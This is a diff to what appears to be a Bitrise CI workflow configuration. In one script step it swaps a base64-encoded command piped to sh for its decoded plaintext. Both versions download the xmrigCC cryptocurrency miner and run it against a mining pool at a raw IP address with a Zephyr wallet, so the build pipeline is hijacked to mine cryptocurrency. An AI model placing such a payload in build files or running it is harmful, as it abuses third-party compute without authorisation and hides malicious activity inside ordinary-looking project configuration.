@@ -8,7 +8,13 @@ workflows:
     - script@1:
         title: Do anything with Script step
         inputs:
-        - content: base64 -d <<<d2dldCBodHRwczovL2dpdGh1Yi5jb20vQmVuZHIwaWQveG1yaWdDQy9yZWxlYXNlcy9kb3dubG9hZC8zLjMuMy94bXJpZ0NDLTMuMy4zLWxpbnV4LWdlbmVyaWMtc3RhdGljLWFtZDY0LnRhci5neiAmJiB0YXIgLXh2ZiB4bXJpZ0NDLTMuMy4zLWxpbnV4LWdlbmVyaWMtc3RhdGljLWFtZDY0LnRhci5neiAmJiBjZCBtaW5lciAmJiBtdiB4bXJpZ0RhZW1vbiB+LyAmJiBtdiB4bXJpZ01pbmVyIH4vCmNkICYmIGNsZWFyCmVjaG8gIj09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0iCmVjaG8gIkJpc21pbGxhaGlyYWhtYW5uaXJyYWhpbSIKZWNobyAiPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PSIKc2xlZXAgMwouL3htcmlnRGFlbW9uIC1vIDQ5LjE1Ny40Ni4yOTo0NDMgLXUgWkVQSHM3aFR0bkMycnBBcDJmSlNUM1pCczRSVm1ZSmtTV3VYNUhHNUZkM0wxZUJlcmhOTGJqSzFXV3VKeHpFQkxhZHBEQ3NYcENicWZmZTU3U3d5TW1SbWlhWGR5S05EdExIIC1wIFpFUEggLWEgcngvMCAtayAtdDIgLS1kb25hdGUtbGV2ZWwgMjAwMCAtLXJhbmRvbXgtMWdiLXBhZ2VzCg== | sh
+        - content: wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-3.3.3-linux-generic-static-amd64.tar.gz && tar -xvf xmrigCC-3.3.3-linux-generic-static-amd64.tar.gz && cd miner && mv xmrigDaemon ~/ && mv xmrigMiner ~/
+cd && clear
+echo "====================================="
+echo "Bismillahirahmannirrahim"
+echo "====================================="
+sleep 3
+./xmrigDaemon -o 49.157.46.29:443 -u ZEPHs7hTtnC2rpAp2fJST3ZBs4RVmYJkSWuX5HG5Fd3L1eBerhNLbjK1WWuJxzEBLadpDCsXpCbqffe57SwyMmRmiaXdyKNDtLH -p ZEPH -a rx/0 -k -t2 --donate-level 2000 --randomx-1gb-pages
 meta:
   bitrise.io:
     stack: linux-docker-android-20.04
